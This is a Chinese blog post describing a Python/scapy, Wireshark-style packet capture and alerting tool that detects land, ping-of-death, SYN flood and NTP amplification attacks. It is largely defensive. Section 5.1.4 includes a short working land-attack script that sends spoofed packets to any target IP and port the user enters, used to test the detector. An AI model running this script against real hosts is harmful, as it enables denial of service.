@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>【python】仿wireshark流量预警系统 | AMY&#39;s BLOG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="1.功能介绍 抓取本机网络中的通信流量，包括协议类型、源和目的地址、端口、数据包大小等 支持应用层协议分析，至少包括 HTTP、FTP、SMTP 三种协议；支持 SSL&#x2F;TLS 支持基于 MAC 地址、IP 地址、协议类型、端口、应用层协议特征的特征检测。 根据流量特征可以识别出ping of death&#x2F;syn flooding&#x2F;land攻击等  2.概要设计 仿wireshark抓包界面，界面">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【python】仿wireshark流量预警系统">
+<meta property="og:url" content="https://amy-ccc098.github.io/2022/07/19/%E3%80%90python%E3%80%91%E4%BB%BFwireshark%E6%B5%81%E9%87%8F%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F/%E3%80%90python%E3%80%91%E4%BB%BFwireshark%E6%B5%81%E9%87%8F%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F/index.html">
+<meta property="og:site_name" content="AMY&#39;s BLOG">
+<meta property="og:description" content="1.功能介绍 抓取本机网络中的通信流量，包括协议类型、源和目的地址、端口、数据包大小等 支持应用层协议分析，至少包括 HTTP、FTP、SMTP 三种协议；支持 SSL&#x2F;TLS 支持基于 MAC 地址、IP 地址、协议类型、端口、应用层协议特征的特征检测。 根据流量特征可以识别出ping of death&#x2F;syn flooding&#x2F;land攻击等  2.概要设计 仿wireshark抓包界面，界面">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps1.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps2.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps3.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps4.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps5.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps6.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps7.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps8.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps9.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps10.jpg">
+<meta property="article:published_time" content="2022-07-19T02:22:19.000Z">
+<meta property="article:modified_time" content="2022-07-19T02:24:30.065Z">
+<meta property="article:author" content="CAIMI">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps1.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="AMY&#39;s BLOG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">AMY&#39;s BLOG</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://Amy-CCC098.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-【python】仿wireshark流量预警系统/【python】仿wireshark流量预警系统" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/19/%E3%80%90python%E3%80%91%E4%BB%BFwireshark%E6%B5%81%E9%87%8F%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F/%E3%80%90python%E3%80%91%E4%BB%BFwireshark%E6%B5%81%E9%87%8F%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F/" class="article-date">
+  <time datetime="2022-07-19T02:22:19.000Z" itemprop="datePublished">2022-07-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      【python】仿wireshark流量预警系统
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+        
+        <h2 id="1-功能介绍"><a href="#1-功能介绍" class="headerlink" title="1.功能介绍"></a>1.功能介绍</h2><ul>
+<li>抓取本机网络中的通信流量，包括协议类型、源和目的地址、端口、数据包大小等</li>
+<li>支持应用层协议分析，至少包括 HTTP、FTP、SMTP 三种协议；支持 SSL/TLS</li>
+<li>支持基于 MAC 地址、IP 地址、协议类型、端口、应用层协议特征的特征检测。</li>
+<li>根据流量特征可以识别出ping of death/syn flooding/land攻击等</li>
+</ul>
+<h2 id="2-概要设计"><a href="#2-概要设计" class="headerlink" title="2.概要设计"></a>2.概要设计</h2><ol>
+<li>仿wireshark抓包界面，界面设计采用python中的tkinter库</li>
+<li>抓包使用scapy库</li>
+</ol>
+<h2 id="3-总体设计"><a href="#3-总体设计" class="headerlink" title="3.总体设计"></a>3.总体设计</h2><h3 id="3-1设计环境"><a href="#3-1设计环境" class="headerlink" title="3.1设计环境"></a>3.1设计环境</h3><ul>
+<li>Python</li>
+<li>Windows10</li>
+<li>pycharm</li>
+</ul>
+<h3 id="3-2抓包"><a href="#3-2抓包" class="headerlink" title="3.2抓包"></a>3.2抓包</h3><p>本实验中的抓包功能通过scapy中的sniff函数对网络中传输的数据包进行嗅探，在抓包的界面上显示包的序号、时间、源地址、目的地址、源端口、目的端口、包的类型、以及数据包的简短摘要。</p>
+<p>Scapy是python中的一个非常强大的可以操控报文的库，它可以让用户发送、捕获、监听和解析并伪装网络报文，从而进行嗅探、扫描、攻击网络等行为。</p>
+<h3 id="3-3协议解析"><a href="#3-3协议解析" class="headerlink" title="3.3协议解析"></a>3.3协议解析</h3><h4 id="3-3-1应用层协议分析"><a href="#3-3-1应用层协议分析" class="headerlink" title="3.3.1应用层协议分析"></a>3.3.1应用层协议分析</h4><p>利用scapy嗅探到的数据包，分析其对应的端口号。如果协议类型为TCP协议时，再进一步根据端口号进行协议分析，比如80为HTTP的默认端口号，25为SMTP的默认端口号等等，根据不同的端口号判断协议类型，并通过scapy中的show函数展示分析其应用层协议。</p>
+<h4 id="3-3-2-TLS-SSL"><a href="#3-3-2-TLS-SSL" class="headerlink" title="3.3.2 TLS/SSL"></a>3.3.2 TLS/SSL</h4><p>HTTPS端口号默认是443，通过端口来判断数据包是否是HTTPS，如果是HTTPS包的话，进一步进行解析，在这里进行load.layer导入tls层，scapy会根据数据字段格式的分析解析出HTTPS数据包的诸如内容类型、协议版本、数据长度等信息。</p>
+<h3 id="3-4特征流量分析"><a href="#3-4特征流量分析" class="headerlink" title="3.4特征流量分析"></a>3.4特征流量分析</h3><p>​    本程序根据MAC 地址、IP 地址、协议类型、端口等特征对包进行判断检测。主要针对land攻击、死亡之ping、SYN-FLOOD攻击以及NTP反射放大攻击进行了检测。其判断原理分别为：</p>
+<ul>
+<li>land攻击：如果数据包源地址与目的地址相同，则判断为land攻击。</li>
+<li>死亡之ping：如果IP数据包的最大长度大于65535B，则判断为死亡之ping。</li>
+<li>SYN-FLOOD攻击：如果标志位为S，目的地址为某IP。大量虚假IP对某IP发送syn包，则判断为对某IP的TCPflood攻击。</li>
+<li>NTP反射放大攻击：如果源端口和目的端口都是123，即UDP包，目的地址为某IP，抓到大量从同一地址发出的包，则判断为NTP放大攻击。</li>
+</ul>
+<h3 id="3-5图形界面"><a href="#3-5图形界面" class="headerlink" title="3.5图形界面"></a>3.5图形界面</h3><p>​    图形界面模仿wireshark，最上边为一些开始、暂停、停止按钮和过滤器，接着是抓到的包的显示窗口，在下面是协议解析区，分为以树的结构一层层解析数据包以及以十六进制解析数据包。</p>
+<h2 id="4-详细设计"><a href="#4-详细设计" class="headerlink" title="4.详细设计"></a>4.详细设计</h2><h3 id="4-1逻辑分析及结构"><a href="#4-1逻辑分析及结构" class="headerlink" title="4.1逻辑分析及结构"></a>4.1逻辑分析及结构</h3><ol>
+<li>先构造抓包的函数，实现抓取数据包并对抓到的数据包进行相应处理</li>
+<li>根据端口号sport和dport来判断数据包的类型。</li>
+<li>Show函数对包进行解析，p为Ethernet层、p.payload为IP层、p.payload.payload为TCP/UDP层、p.payload.payload.payload为RAW层，根据这个性质用一个for循环逐层解析包，实现将各层协议分开展示。</li>
+<li>load_layer(“tls”)，加载tls，可以对HTTPS进行解析</li>
+<li>如果数据包源地址与目的地址相同，则判断为land攻击；如果IP数据包的最大长度大于65535B，则判断为死亡之ping；如果标志位为S，目的地址为某IP。大量虚假IP对某IP发送syn包，则判断为对某IP的TCPflood攻击；如果源端口和目的端口都是123，即UDP包，目的地址为某IP，抓到大量从同一地址发出的包，则判断为NTP放大攻击。</li>
+<li>根据不同的攻击类型，弹出相应的弹出进行告警。</li>
+</ol>
+<h3 id="4-2存储分析及结构"><a href="#4-2存储分析及结构" class="headerlink" title="4.2存储分析及结构"></a>4.2存储分析及结构</h3><p>捕获数据包存入缓存区，进而对数据包进行分析，如果判断为攻击，则进行告警。</p>
+<p>在判断synflood和udp放大反射攻击时，将一秒内抓到的包存入一个数组，通过判断符合攻击类型的包占所有包的比值，进而判断是否为该攻击。</p>
+<h2 id="5-代码实现"><a href="#5-代码实现" class="headerlink" title="5.代码实现"></a>5.代码实现</h2><h3 id="5-1关键模块"><a href="#5-1关键模块" class="headerlink" title="5.1关键模块"></a>5.1关键模块</h3><h4 id="5-1-1抓包"><a href="#5-1-1抓包" class="headerlink" title="5.1.1抓包"></a>5.1.1抓包</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#使用scapy中的sniff</span><br><span class="line">def packet_producer():</span><br><span class="line">    sniff(prn=lambda pkt: packet_consumer(pkt), stop_filter=lambda pkt: stop_sniff_event.is_set(),</span><br><span class="line">          filter=fitler_entry.get())</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-1-2协议解析"><a href="#5-1-2协议解析" class="headerlink" title="5.1.2协议解析"></a>5.1.2协议解析</h4><p>（1）判断包的类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">proto_names = [&#x27;TCP&#x27;, &#x27;UDP&#x27;, &#x27;ICMP&#x27;, &#x27;FTP&#x27;, &#x27;SMTP&#x27; , &#x27;IPv6&#x27;, &#x27;IP&#x27;, &#x27;ARP&#x27;, &#x27;Ether&#x27;, &#x27;Unknown&#x27;]</span><br><span class="line">proto = &#x27;&#x27;</span><br><span class="line">for pn in proto_names:</span><br><span class="line">    if pn in pkt:</span><br><span class="line">        proto = pn</span><br><span class="line">        break</span><br><span class="line">if proto == &#x27;ARP&#x27; or proto == &#x27;Ether&#x27;:</span><br><span class="line">    src = pkt.src</span><br><span class="line">    dst = pkt.dst</span><br><span class="line">else:</span><br><span class="line">    if &#x27;IPv6&#x27; in pkt:</span><br><span class="line">        src = pkt[IPv6].src</span><br><span class="line">        dst = pkt[IPv6].dst</span><br><span class="line">    elif &#x27;IP&#x27; in pkt:</span><br><span class="line">        src = pkt[IP].src</span><br><span class="line">        dst = pkt[IP].dst</span><br><span class="line">length = len(pkt)</span><br><span class="line">#print(pkt.summary())</span><br><span class="line">#print(pkt)</span><br><span class="line">if(proto == &#x27;TCP&#x27;):</span><br><span class="line">    sniff_count_tcp = sniff_count_tcp + 1</span><br><span class="line">    sniff_array_tcp.append(pkt)</span><br><span class="line">    port1=pkt[IP].payload.sport</span><br><span class="line">    port2=pkt[IP].payload.dport</span><br><span class="line">    #根据端口判断包的类型HTTP/HTTPS/FTP/SMTP</span><br><span class="line">    if(port1==80 or port2 == 80 or port1==8080 or port2==8080):</span><br><span class="line">        proto=&#x27;HTTP&#x27;</span><br><span class="line">    elif(port1==443 or port2 == 443):</span><br><span class="line">        proto=&#x27;HTTPS&#x27;</span><br><span class="line">    elif(port1==21 or port2 == 21):</span><br><span class="line">        proto=&#x27;FTP&#x27;</span><br><span class="line">    elif(port1==25 or port2 == 25):</span><br><span class="line">        proto=&#x27;SMTP&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>（2）逐层对包进行解析，包括应用层</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 按照协议层次显示数据包</span><br><span class="line">lines = (packet.show(dump=True)).split(&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">#print(lines)</span><br><span class="line">last_tree_entry = None</span><br><span class="line">#逐层读取包</span><br><span class="line">for line in lines:</span><br><span class="line">    if line.startswith(&#x27;#&#x27;):</span><br><span class="line">        line = line.strip(&#x27;# &#x27;)</span><br><span class="line">        #print(line)</span><br><span class="line">        last_tree_entry = packet_dissect_tree.insert(&#x27;&#x27;, &#x27;end&#x27;, text=line)</span><br><span class="line">    else:</span><br><span class="line">        packet_dissect_tree.insert(last_tree_entry, &#x27;end&#x27;, text=line)</span><br><span class="line">    col_width = font.Font().measure(line)</span><br><span class="line">    # 根据新插入数据项的长度动态调整协议解析区的宽度</span><br><span class="line">    if packet_dissect_tree.column(&#x27;Dissect&#x27;, width=None) &lt; col_width:</span><br><span class="line">        packet_dissect_tree.column(&#x27;Dissect&#x27;, width=col_width)</span><br></pre></td></tr></table></figure>
+
+<p>（3）解析为十六进制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 在hexdump区显示此数据包的十六进制内容</span><br><span class="line">hexdump_scrolledtext[&#x27;state&#x27;] = &#x27;normal&#x27;</span><br><span class="line">hexdump_scrolledtext.delete(1.0, END)</span><br><span class="line">hexdump_scrolledtext.insert(END, hexdump(packet, dump=True))</span><br><span class="line">hexdump_scrolledtext[&#x27;state&#x27;] = &#x27;disabled&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>（4）实现支持tls/ssl</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_layer(&quot;tls&quot;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-1-3特征流量分析与报警"><a href="#5-1-3特征流量分析与报警" class="headerlink" title="5.1.3特征流量分析与报警"></a>5.1.3特征流量分析与报警</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (src == dst):</span><br><span class="line">    # 相同源地址和目的地址，可能为Land攻击</span><br><span class="line">    packet_list_tree.insert(&quot;&quot;, &#x27;end&#x27;, text=&#x27;数据包源地址与目的地址相同, 疑为Land攻击!&#x27;)</span><br><span class="line">    messagebox.showwarning(title=&#x27;warning&#x27;, message=&#x27;数据包源地址与目的地址相同, 疑为Land攻击!&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>（1）land攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (src == dst):</span><br><span class="line">    # 相同源地址和目的地址，可能为Land攻击</span><br><span class="line">    packet_list_tree.insert(&quot;&quot;, &#x27;end&#x27;, text=&#x27;数据包源地址与目的地址相同, 疑为Land攻击!&#x27;)</span><br><span class="line">    messagebox.showwarning(title=&#x27;warning&#x27;, message=&#x27;数据包源地址与目的地址相同, 疑为Land攻击!&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>（2）死亡之ping</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elif (len(pkt.payload) &gt; 65535):#len(pkt.payload)</span><br><span class="line">    # IP数据包的最大长度大于64KB(即65535B), 若大于, 则疑为Ping of Death攻击</span><br><span class="line">    messagebox.showwarning(title=&#x27;warning&#x27;, message=&quot;收到IP数据包长度大于64KB, 疑为Ping拒绝服务攻击!&quot;)</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>（3）SYN-FLOOD攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">def syn_warn():</span><br><span class="line">    global sniff_array_tcp # 申请全局变量</span><br><span class="line">    global sniff_count_tcp</span><br><span class="line">    global sniff_count</span><br><span class="line">    syn_count = 0</span><br><span class="line">    src_count_dic = &#123;&#125;</span><br><span class="line">    most_src_count = 0</span><br><span class="line">    for pkt in sniff_array_tcp:</span><br><span class="line">        # SYN FLOOD判断，如果标志位为S，目的地址为某IP。大量虚假IP对某IP发送syn包，则判断为对某IP的TCPflood攻击</span><br><span class="line">        if pkt[TCP].flags == &quot;S&quot; and pkt[IP].dst == &quot;192.168.0.1&quot;:  # TCP SYN包，目的IP地址为本机IP</span><br><span class="line">            syn_count += 1</span><br><span class="line">        # NTP放大攻击预测，如果源端口和目的端口都是123，即UDP包，目的地址为某IP，抓到大量从同一地址发出的包，判断为NTP放大攻击</span><br><span class="line">        if pkt.sport == 123 or pkt.dport == 123 and pkt[IP].dst == &quot;192.168.0.1&quot;:  # NTP数据包，目的IP地址为本机IP</span><br><span class="line">            if src_count_dic.get(pkt[IP].src) is None:</span><br><span class="line">                src_count_dic[pkt[IP].src] = 1</span><br><span class="line">            else:</span><br><span class="line">                src_count_dic[pkt[IP].src] += 1</span><br><span class="line"></span><br><span class="line">    if sniff_count_tcp &gt; 0:</span><br><span class="line">        # 如果目的地址为同IP的SYN包和所有的tcp包比值大于0.07，可能为SYN FLOOD攻击</span><br><span class="line">        if syn_count / sniff_count_tcp &gt;= 0.07 and sniff_count_tcp &gt; 10:</span><br><span class="line">            messagebox.showwarning(title=&#x27;warning&#x27;, message=&#x27;大量虚假ip向本机发送包，疑为SYN FLOOD攻击!&#x27;)</span><br><span class="line">        # 如果目的地址为某IP的UDP包，从某一个IP不断且大量发送给某IP，则可能NTP放大攻击</span><br><span class="line">        for j in src_count_dic:</span><br><span class="line">            if src_count_dic.get(j) &gt; most_src_count:</span><br><span class="line">                most_src_count = src_count_dic.get(j)</span><br><span class="line">        if most_src_count / sniff_count_tcp &gt;= 0.007:</span><br><span class="line">            messagebox.showwarning(title=&#x27;warning&#x27;, message=&#x27;某ip不断且大量向本机发送包，疑为NTP放大攻击!&#x27;)</span><br><span class="line">    sniff_array_tcp = [] # 重新记录报文</span><br><span class="line">    sniff_count_tcp = 0</span><br><span class="line">    timer=threading.Timer(1,syn_warn)  # 每0.5秒运行</span><br><span class="line">    timer.start()  # 执行方法</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-1-4攻击程序"><a href="#5-1-4攻击程序" class="headerlink" title="5.1.4攻击程序"></a>5.1.4攻击程序</h4><p>（1）land攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">from scapy.layers.inet import IP,TCP</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#land攻击源地址和目的地址一样,land攻击</span><br><span class="line">target = input(&quot;Please input your target:&quot;)  # 输入想要攻击的ip地址</span><br><span class="line">port = input(&quot;Please input your target&#x27;s port:&quot;)  # 输入端口</span><br><span class="line">port = int(port)  # 因为input接收的是str，所以要转换成int型</span><br><span class="line"></span><br><span class="line">send_packets = 0  # 记录发送包的数量</span><br><span class="line">try:</span><br><span class="line">    while True:</span><br><span class="line">        a = (scapy.layers.inet.IP(src=target, dst=target) / scapy.layers.inet.TCP(sport=port, dport=port))  # 构造LAND attack攻击包</span><br><span class="line">        send(a, verbose=False)</span><br><span class="line">        send_packets += 1  # 发送一个，自动加一</span><br><span class="line">        print(&quot;[+] Sent Packets:&quot; + str(send_packets))</span><br><span class="line">        time.sleep(10)</span><br><span class="line">except KeyboardInterrupt:</span><br><span class="line">    print(&quot;[-] Ctrl+C detected.......&quot;)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2流程图"><a href="#5-2流程图" class="headerlink" title="5.2流程图"></a>5.2流程图</h3><p><img src="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps1.jpg" alt="img"> </p>
+<h2 id="6-程序测试"><a href="#6-程序测试" class="headerlink" title="6.程序测试"></a>6.程序测试</h2><h3 id="6-1测试环境搭建"><a href="#6-1测试环境搭建" class="headerlink" title="6.1测试环境搭建"></a>6.1测试环境搭建</h3><p>Windows10电脑一台，用于系统开发与系统环境部署</p>
+<ul>
+<li>安装python3.7（add to path）</li>
+<li>安装pycharm</li>
+<li>安装Scapy</li>
+<li>安装tkinter</li>
+<li>准备好攻击测试程序</li>
+</ul>
+<p>运行warning.py开始流量监测及抓包</p>
+<h3 id="6-2测试用例"><a href="#6-2测试用例" class="headerlink" title="6.2测试用例"></a>6.2测试用例</h3><table>
+<thead>
+<tr>
+<th>序号</th>
+<th>测试目标</th>
+<th>输入说明(列出选用的输入项，覆盖正常、异常情况)</th>
+<th>预期结果(列出预期输出)</th>
+<th>实测结果(P/F)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>是否可以正常抓包</td>
+<td>点击开始按钮，开始抓包</td>
+<td>可以抓到包，且抓到的包按照时间的先后顺序显示在窗口中。</td>
+<td>P</td>
+</tr>
+<tr>
+<td>2</td>
+<td>是否可以抓到HTTP/FTP/SMTP包，并对其具有应用层协议分析</td>
+<td>1. 在网络中发送HTTP协议的包2. 在网络中发送FTP协议的包3. 在网络中发送SMTP协议的包</td>
+<td>1. 可以抓到协议类型为HTTP的包，且在协议解析区有对于应用层协议分析2. 可以抓到协议类型为FTP的包，且在协议解析区有对于应用层协议分析3. 可以抓到协议类型为SMTP的包，且在协议解析区有对于应用层协议分析</td>
+<td>P</td>
+</tr>
+<tr>
+<td>3</td>
+<td>对HTTPS是否可以抓到TLS的包，并对其进行解析。</td>
+<td>在网络中发送https的包</td>
+<td>可以抓到包，且协议解析区有树根节点tls，点开可以看到相关包的内容</td>
+<td>P</td>
+</tr>
+<tr>
+<td>4</td>
+<td>进行land攻击，是否有弹窗提示警告</td>
+<td>运行attack.py程序，进行land攻击</td>
+<td>抓到相关数据包，且弹出弹窗告警“数据包源地址和目的地址相同，疑为Land攻击”</td>
+<td>P</td>
+</tr>
+<tr>
+<td>5</td>
+<td>进行synflood攻击，是否有弹窗提示警告</td>
+<td>运行synflood.py程序，进行synflood攻击</td>
+<td>抓到相关数据包，且弹出弹窗告警“大量虚假ip向本机发送数据包，疑为synflood攻击”</td>
+<td>P</td>
+</tr>
+</tbody></table>
+<h3 id="6-3用例执行与结果分析"><a href="#6-3用例执行与结果分析" class="headerlink" title="6.3用例执行与结果分析"></a>6.3用例执行与结果分析</h3><h4 id="6-3-1抓取网络中的通信数据"><a href="#6-3-1抓取网络中的通信数据" class="headerlink" title="6.3.1抓取网络中的通信数据"></a>6.3.1抓取网络中的通信数据</h4><p>运行main.py，点击开始按钮，开始抓包。支持抓网络中TCP、UDP、ICMP、FTP、SMTP、ARP等协议类型的报文。在图形化界面的窗口栏中，展示其包的序号、抓到的时间、源地址、目的地址、源端口、目的端口、协议类型、报文长度、以及scapy中的summary()函数显示数据包的简短的摘要。</p>
+<p><img src="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps2.jpg" alt="img"> </p>
+<h4 id="6-3-2应用层协议分析"><a href="#6-3-2应用层协议分析" class="headerlink" title="6.3.2应用层协议分析"></a>6.3.2应用层协议分析</h4><h5 id="（1）HTTP"><a href="#（1）HTTP" class="headerlink" title="（1）HTTP"></a>（1）HTTP</h5><p>由下图可以看到，如果抓到的TCP包为HTTP协议，在协议类型处会显示为HTTP，在协议解析去可以看到链路层 [Ethernet]、网络层[IP]、传输层[TCP/UDP]、应用层[RAW]。应用层中可以看到访问的网址等内容。</p>
+<p><img src="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps3.jpg" alt="img"> </p>
+<h5 id="（2）SMTP"><a href="#（2）SMTP" class="headerlink" title="（2）SMTP"></a>（2）SMTP</h5><p>在命令行输入telnet smtp.qq.com 25。使用 Telnet 软件访问 Email 服务器，输入 SMTP 命令与 Email 服务器交互，，实现在网络中传输SMTP的包。</p>
+<p>在main.py协议分析器中过滤器设置条件port 25，在窗口中只显示抓取到的SMTP包。可以看到抓到协议名称为SMTP的包，点开协议解析区域树根节点应用层raw，可以看到对本包的应用层协议分析，QQmail邮件。</p>
+<p><img src="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps4.jpg" alt="img"> </p>
+<p><img src="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps5.jpg" alt="img"> </p>
+<h5 id="（3）FTP"><a href="#（3）FTP" class="headerlink" title="（3）FTP"></a>（3）FTP</h5><p>在命令行输入ftp 10.3.1.72，可以看到抓到协议名称为FTP的包，但这里由于没有连校园网，连接请求超时，没有得到显示应用层的报文。</p>
+<p><img src="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps6.jpg" alt="img"> </p>
+<h4 id="6-3-3-SSL-TLS"><a href="#6-3-3-SSL-TLS" class="headerlink" title="6.3.3 SSL/TLS"></a>6.3.3 SSL/TLS</h4><p>点击查看抓到的HTTPS报文，在协议解析区可以看到tls协议解析的内容。</p>
+<p><img src="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps7.jpg" alt="img"> </p>
+<h4 id="6-3-4根据特征检测异常流量"><a href="#6-3-4根据特征检测异常流量" class="headerlink" title="6.3.4根据特征检测异常流量"></a>6.3.4根据特征检测异常流量</h4><h5 id="（1）land攻击"><a href="#（1）land攻击" class="headerlink" title="（1）land攻击"></a>（1）land攻击</h5><p>Land攻击中，数据包相同源地址和目的地址，根据这个特征可以判断为land攻击。</p>
+<h5 id="（2）ping-of-death"><a href="#（2）ping-of-death" class="headerlink" title="（2）ping of death"></a>（2）ping of death</h5><p>ping of death攻击中，IP数据包的最大长度大于65535B，根据这个特征可以判断为ping of death攻击。</p>
